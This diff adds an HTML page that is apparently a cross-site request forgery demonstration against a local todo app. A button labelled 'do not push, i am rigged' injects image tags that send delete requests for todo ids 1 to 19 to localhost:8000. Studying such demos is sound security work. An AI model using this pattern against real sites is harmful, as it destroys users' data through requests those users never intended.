@@ -1,0 +1,17 @@
+<html>
+
+<body>
+    <button onclick="deleteAll()">do not push, i am rigged</button>
+    <div id="pics">
+    </div>
+    <script>
+        async function deleteAll() {
+            for (var i = 1; i < 20; i++) {
+                document.getElementById('pics').innerHTML += `<img src="http://localhost:8000/todos/delete?id=${i}">`
+                console.log(`tried to delete todo with id ${i}`)
+            }
+        }
+    </script>
+</body>
+
+</html>
